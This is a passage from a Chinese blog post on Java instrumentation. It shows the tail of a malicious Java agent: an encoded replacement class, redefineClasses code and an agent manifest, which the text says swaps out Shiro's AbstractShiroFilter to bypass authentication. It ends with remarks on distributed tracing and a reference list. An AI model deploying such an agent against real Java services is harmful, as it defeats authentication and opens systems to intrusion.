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");
          ClassDefinition classDefinition = new ClassDefinition(clazz, arrayOfByte);
          try {
            paramInstrumentation.redefineClasses(new ClassDefinition[] { classDefinition });
          } catch (Exception exception) {
            exception.printStackTrace();
          }
        }
      }
    } catch (Exception exception) {}
  }
}
```

agent.jar/META-INF/MANIFEST.MF：

```MF
Manifest-Version: 1.0
Can-Redefine-Classes: true
Agent-Class: HotSwapAgent
Premain-Class: HotSwapAgent
Can-Retransform-Classes: true
```

作者用自定义类替换 “org.apache.shiro.web.servlet.AbstractShiroFilter”，企图绕过鉴权。

## 写在后面

微服务架构下，进程间的联系错综复杂，客户端的请求到了服务器端后可能形成了复杂的调用链，假如发生了异常，如何查明哪里发生故障以及什么原因导致性能下降？**分布式追踪（Distributed Tracing）** 正是一种解决方案。Java 王国有着许许多多的 APM（Application Performance Monitoring）系统专门解决此类问题，例如 [SkyWalking](https://github.com/apache/skywalking)、[Zipkin](https://github.com/openzipkin/zipkin)、[Pinpoint](https://github.com/naver/pinpoint)，它们或多或少支持了名为 [OpenTracing](https://opentracing.io/) 的标准，分布式追踪的标准与技术非常有助于微服务架构下的故障排除。

> 本文首发于 https://h2cone.github.io

## 文章参考

[0] [Package java.lang.instrument](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)

[1] [Instrumentation (computer programming)](https://en.wikipedia.org/wiki/Instrumentation_(computer_programming))

[2] [Interface Instrumentation](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/Instrumentation.html)

[3] [Attach API](https://docs.oracle.com/javase/8/docs/jdk/api/attach/spec/com/sun/tools/attach/package-summary.html)

[4] [入门科普，围绕JVM的各种外挂技术](https://mp.weixin.qq.com/s/cwU2rLOuwock048rKBz3ew)

[?] [java-instrumentation](https://javapapers.com/core-java/java-instrumentation/)

[?] [Guide to Java Instrumentation](https://www.baeldung.com/java-instrumentation)

[?] [Java Attach API](https://www.cnblogs.com/LittleHann/p/4783581.html)

[?] [JAVA 拾遗 --Instrument 机制](https://www.cnkirito.moe/instrument/)

[?] [Instrumentation: querying the memory usage of a Java object](https://www.javamex.com/tutorials/memory/instrumentation.shtml)

[?] [Java动态追踪技术探究](https://tech.meituan.com/2019/02/28/java-dynamic-trace.html)

[?] [JVM 源码分析之 javaagent 原理完全解读](https://www.infoq.cn/article/javaagent-illustrated)

[?] [Java神器BTrace，从入门到熟练小工的手册](https://mp.weixin.qq.com/s/4bZ6iSvpqPsjdvkSoFVhrg)
